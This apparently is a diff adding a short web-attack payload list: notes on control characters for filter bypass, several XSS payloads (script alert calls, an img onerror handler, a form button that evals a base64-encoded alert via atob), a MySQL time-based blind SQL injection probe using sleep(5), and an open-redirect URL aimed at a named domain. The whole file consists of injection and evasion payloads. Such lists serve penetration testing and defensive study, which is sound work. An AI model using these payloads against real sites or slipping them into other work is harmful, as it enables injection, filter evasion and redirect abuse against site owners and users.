@@ -1,0 +1,24 @@
+
+    0x00 — Null byte;
+    0x0D — Carriage return;
+    0x0A — Line feed;
+    0x0B — Vertical Tab;
+    0x09 — Horizontal tab;
+    0x0C — New page
+
+
+<script>window['alert'](0)</script>
+<script>parent['alert'](1)</script>
+<script>self['alert'](2)</script>
+
+SELECT if(LPAD(' ',4,version())='5.7',sleep(5),null);
+
+
+
+†‡•<img src=a onerror=javascript:alert('hacked')>…‰€
+
+
+http://my.dev.owox.com//www.google.com/%2e%2e%2f
+
+
+<form><button formaction=javascript:top['ev'+'al'](self['\x61\x74\x6f\x62'](`YWxlcnQoMSk7`));//
